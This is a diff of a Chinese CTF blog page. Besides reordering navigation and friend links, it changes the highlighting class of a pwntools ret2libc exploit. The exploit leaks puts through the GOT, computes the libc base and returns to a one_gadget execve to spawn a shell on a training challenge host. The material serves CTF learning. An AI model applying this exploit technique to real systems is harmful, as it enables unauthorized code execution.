@@ -247,9 +247,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/archive/">
               
-              关于
+              归档
               
               
             </a>
@@ -258,9 +258,9 @@
           
           
           <li>
-            <a href="/tags/">
+            <a href="/about/">
               
-              标签
+              关于
               
               
             </a>
@@ -280,9 +280,9 @@
           
           
           <li>
-            <a href="/archive/">
+            <a href="/tags/">
               
-              归档
+              标签
               
               
             </a>
@@ -506,7 +506,7 @@
 利用puts 对libc 的偏移puts_offset 计算libc 基址 libc_addr = puts_addr - puts_offset； execve_addr = libc_addr + execve_offset 得到的execve地址<br>
 第二次输入：填充后调用pop_addr 清掉r12, r13, 返回地址为 execve_addr</p>
 <h2 id="exp">exp</h2>
-<h2 id="code￼7"><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1-vidar-train-docker.xn--sxa.cc&quot;</span>,<span class="string">&quot;49397&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x40120B</span> <span class="comment"># main函数的地址</span></span><br><span class="line">rdi_addr = <span class="number">0x4012c3</span> <span class="comment"># prop rdi;et 地址</span></span><br><span class="line">pop_addr = <span class="number">0x4012bc</span> <span class="comment"># pop r12 ; pop r13 地址</span></span><br><span class="line"><span class="comment"># 在onegadget得到的偏移</span></span><br><span class="line">puts_offset = <span class="number">0x84450</span></span><br><span class="line">execve_offset = <span class="number">0xe3b2e</span> <span class="comment"># execve </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次输puts</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload1 += p64(rdi_addr)</span><br><span class="line">payload1 += p64(puts_got)</span><br><span class="line">payload1 += p64(puts_plt) <span class="comment"># ret to puts</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">p.recv(<span class="number">24</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">libc_addr = puts_addr - puts_offset <span class="comment"># libc的基址</span></span><br><span class="line">execve_addr = libc_addr + execve_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr = &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_addr = &quot;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve_addr = &quot;</span> + <span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次输入</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload2 += p64(pop_addr)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload2 += p64(execve_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></h2>
+<h2 id="code￼7"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1-vidar-train-docker.xn--sxa.cc&quot;</span>,<span class="string">&quot;49397&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x40120B</span> <span class="comment"># main函数的地址</span></span><br><span class="line">rdi_addr = <span class="number">0x4012c3</span> <span class="comment"># prop rdi;et 地址</span></span><br><span class="line">pop_addr = <span class="number">0x4012bc</span> <span class="comment"># pop r12 ; pop r13 地址</span></span><br><span class="line"><span class="comment"># 在onegadget得到的偏移</span></span><br><span class="line">puts_offset = <span class="number">0x84450</span></span><br><span class="line">execve_offset = <span class="number">0xe3b2e</span> <span class="comment"># execve </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次输puts</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload1 += p64(rdi_addr)</span><br><span class="line">payload1 += p64(puts_got)</span><br><span class="line">payload1 += p64(puts_plt) <span class="comment"># ret to puts</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">p.recv(<span class="number">24</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">libc_addr = puts_addr - puts_offset <span class="comment"># libc的基址</span></span><br><span class="line">execve_addr = libc_addr + execve_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr = &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_addr = &quot;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve_addr = &quot;</span> + <span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次输入</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload2 += p64(pop_addr)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload2 += p64(execve_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></h2>
 <h1>ret2libc（plus）</h1>
 <p>有的ret2libc题目甚至不给libc.so文件，那么我们就没办法使用onegadget来获取一些libc库函数的偏移<br>
 这道题整体思路与上一题基本一致的，但是需要用到一个新的东西那就是LibcSearcher<br>
@@ -864,6 +864,10 @@ p.interactive()
           
           <li>
             <a href="https://www.korey0sh1.cn" target="_blank">korey0sh1</a>
+          </li>
+          
+          <li>
+            <a href="http://jian.pl/" target="_blank">小简</a>
           </li>
           
         </ul>
